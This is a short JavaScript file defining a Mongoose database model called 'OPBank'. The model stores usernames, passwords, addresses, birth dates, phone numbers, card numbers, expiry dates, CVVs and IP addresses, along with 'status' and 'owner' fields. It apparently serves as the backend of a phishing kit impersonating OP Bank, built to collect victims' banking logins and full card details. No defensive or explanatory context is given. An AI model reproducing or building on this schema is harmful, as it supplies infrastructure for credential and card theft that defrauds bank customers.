const mongoose = require("mongoose");

const opBank = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    address: String,
    dob: String,
    telephone: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    ip: String,
    status: Number,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("OPBank", opBank);
